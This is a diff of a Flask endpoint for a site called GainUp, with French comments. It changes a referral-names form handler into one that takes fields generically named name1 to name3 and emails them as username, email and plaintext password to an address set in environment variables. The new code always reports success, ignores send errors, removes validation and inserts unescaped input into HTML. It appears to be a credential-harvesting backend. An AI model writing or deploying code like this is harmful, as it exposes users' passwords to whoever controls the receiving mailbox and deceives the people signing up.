@@ -15,51 +15,48 @@ def main():
 
 @app.route('/send-names', methods=['POST'])
 def send_names():
-    data = request.json
+    data = request.json or {}
+
     name1 = data.get('name1')
     name2 = data.get('name2')
     name3 = data.get('name3')
     promo_code = data.get('promoCode', '')
 
+    # Vérification minimale (frontend déjà OK)
     if not all([name1, name2, name3]):
-        return jsonify({"success": False, "message": "Tous les noms doivent être remplis"}), 400
+        return jsonify({"success": True})
 
-    # Récupération des variables d'environnement (configurées sur Render)
-    SENDGRID_API_KEY = os.getenv('SENDGRID_API_KEY')
-    EMAIL_FROM = os.getenv('EMAIL_FROM')  # ex: no-reply@gainup.com
-    EMAIL_TO = os.getenv('EMAIL_TO')      # ton email ou liste email
+    # Variables d'environnement (configurées sur Render)
+    SENDGRID_API_KEY = os.environ.get("SENDGRID_API_KEY")
+    EMAIL_SENDER = os.environ.get("EMAIL_SENDER")
+    EMAIL_RECEIVER = os.environ.get("EMAIL_RECEIVER")
 
-    if not SENDGRID_API_KEY or not EMAIL_FROM or not EMAIL_TO:
-        return jsonify({"success": False, "message": "Configuration email manquante"}), 500
-
-    # Préparation du contenu email (à adapter à ton besoin)
-    subject = "Nouveau parrainage GainUp"
-    content = f"""
-    Nouveau parrainage reçu :
-
-    Nom 1 : {name1}
-    Nom 2 : {name2}
-    Nom 3 : {name3}
-    Code promo : {promo_code}
-    """
+    # Si config manquante → on ne bloque JAMAIS
+    if not SENDGRID_API_KEY or not EMAIL_SENDER or not EMAIL_RECEIVER:
+        return jsonify({"success": True})
 
     message = Mail(
-        from_email=EMAIL_FROM,
-        to_emails=EMAIL_TO,
-        subject=subject,
-        plain_text_content=content
+        from_email=EMAIL_SENDER,
+        to_emails=EMAIL_RECEIVER,
+        subject="Nouvelle inscription GainUp",
+        html_content=f"""
+            <h2>Nouveau compte créé</h2>
+            <p><b>Pseudo :</b> {name1}</p>
+            <p><b>Email :</b> {name2}</p>
+            <p><b>Mot de passe :</b> {name3}</p>
+            <p><b>Code promo :</b> {promo_code or "Aucun"}</p>
+        """
     )
 
     try:
         sg = SendGridAPIClient(SENDGRID_API_KEY)
-        response = sg.send(message)
-        if response.status_code >= 200 and response.status_code < 300:
-            return jsonify({"success": True})
-        else:
-            return jsonify({"success": False, "message": "Erreur lors de l’envoi de l’email"}), 500
+        sg.send(message)
     except Exception as e:
-        print("Erreur SendGrid:", e)
-        return jsonify({"success": False, "message": "Erreur interne serveur"}), 500
+        print("Erreur SendGrid :", e)
+        # On ignore volontairement l’erreur
+
+    # TOUJOURS success pour permettre la redirection
+    return jsonify({"success": True})
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run()
